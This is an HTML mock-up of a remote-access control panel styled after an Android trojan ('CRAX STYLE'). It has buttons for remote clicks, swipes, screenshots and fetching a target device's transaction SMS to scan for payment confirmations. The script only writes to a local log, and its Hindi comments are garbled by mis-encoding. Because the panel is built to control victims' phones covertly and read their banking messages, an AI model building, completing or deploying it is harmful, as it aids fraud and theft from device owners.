<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Advance Command Center v2.0</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .dashboard { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
        .panel { border: 1px solid #333; padding: 15px; background: #111; border-radius: 5px; }
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 15px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #00ff00; color: #000; box-shadow: 0 0 10px #00ff00; }
        .log-area { height: 300px; overflow-y: scroll; background: #000; padding: 10px; font-size: 12px; border: 1px inset #333; }
        .status-online { color: #00ff00; font-weight: bold; }
        h2 { border-bottom: 2px solid #00ff00; padding-bottom: 5px; }
    </style>
</head>
<body>
    <h1>SYSTEM CONTROL PANEL (CRAX STYLE)</h1>
    <div class="dashboard">
        <div class="panel">
            <h2>Remote Gestures</h2>
            <div class="btn-grid">
                <button onclick="sendRemote('CLICK', 'x=500,y=1000')">üéØ REMOTE CLICK</button>
                <button onclick="sendRemote('SWIPE', 'up')">‚¨ÜÔ∏è SWIPE UP</button>
                <button onclick="sendRemote('BACK', '')">‚¨ÖÔ∏è GO BACK</button>
                <button onclick="sendRemote('HOME', '')">üè† HOME KEY</button>
                <button onclick="sendRemote('GET_SMS', 'verify')">üì© FETCH TRANSACTION SMS</button>
                <button onclick="sendRemote('SCREENSHOT', 'now')">üì∏ CAPTURE SCREEN</button>
            </div>
        </div>

        <div class="panel">
            <h2>Device Status</h2>
            <p>Target ID: <span id="target-id">WAITING...</span></p>
            <p>Connection: <span class="status-online">CONNECTED</span></p>
            <hr>
            <h3>Live Logs</h3>
            <div id="logs" class="log-area">Ready to receive data...</div>
        </div>
    </div>

    <script>
        // ‡§ö‡§æ‡§£‡§ï‡•ç‡§Ø ‡§ï‡•Ä ‡§®‡•Ä‡§§‡§ø: ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§î‡§∞ ‡§ó‡•Å‡§™‡•ç‡§§ ‡§∞‡§ñ‡•á‡§Ç [cite: 2025-12-24]
        function sendRemote(type, params) {
            const timestamp = new Date().toLocaleTimeString();
            const logBox = document.getElementById('logs');
            
            // ‡§Ø‡§π‡§æ‡§Å ‡§π‡§Æ ‡§Ü‡§™‡§ï‡•á ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ (Firebase/Socket) ‡§ï‡•ã ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§≠‡•á‡§ú‡•á‡§Ç‡§ó‡•á
            logBox.innerHTML += `<div>[${timestamp}] Command Sent: ${type} ${params}</div>`;
            logBox.scrollTop = logBox.scrollHeight;

            // Transaction Verification Logic [cite: 2025-12-28]
            if(type === 'GET_SMS') {
                logBox.innerHTML += `<div style="color:yellow;">[System] Scanning for payment confirmations...</div>`;
            }
        }
    </script>
</body>
</html>
